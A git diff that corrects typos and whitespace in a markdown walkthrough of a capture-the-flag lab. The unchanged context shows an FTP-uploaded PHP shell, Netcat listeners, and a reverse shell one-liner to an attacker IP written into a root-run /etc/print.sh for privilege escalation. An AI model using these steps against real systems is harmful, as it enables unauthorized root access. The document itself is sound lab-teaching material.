@@ -81,10 +81,10 @@ This revealed the `/files` directory.
 Accessing this directory in the browser showed that it was linked to the FTP upload location. More specifically:
 
 ```bash
-htttp://10.129.140.31/files/ftp/
+http://10.129.140.31/files/ftp/
 ```
 
-This indicates that the files uploaded via FTP are publicly accesible through the web server, creating a potential path for exploitation.
+This indicates that the files uploaded via FTP are publicly accessible through the web server, creating a potential path for exploitation.
 
 ---
 
@@ -109,7 +109,7 @@ http://10.129.140.31/files/ftp/shell.php
 ```
 ![web](images/web.png)
 
-On the attacker machne, a listener was started using Netcat:
+On the attacker machine, a listener was started using Netcat:
 
 ```bash
 nc -lvnp 4444
@@ -200,6 +200,7 @@ It was observed that the script executes another file located at:
 ```bash
 /etc/print.sh
 ```
+
 This is particularly interesting because it suggests that **print.sh** is executed automatically, likely by a privileged user (root).
 
 Further inspection of the file permissions showed that the **lennie** user has write access to **/etc/print.sh**, which presents an opportunity for privilege escalation.
@@ -210,11 +211,12 @@ To exploit this, a reverse shell payload was written into the file:
 echo 'bash -i >& /dev/tcp/10.129.122.137/4445 0>&1' > /etc/print.sh
 ```
 
-A listener was then started on the attacker machin:
+A listener was then started on the attacker machine:
 
 ```bash
 nc -lvnp 4445
 ```
+
 Once the script was executed automatically by the system, a reverse shell was received with root privileges.
 
 ![root](images/root.png)
@@ -265,37 +267,3 @@ Overall, it provides a clear example of how attackers combine enumeration, explo
 
 
 > 🔒 This lab highlights how small misconfigurations can lead to full system compromise.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
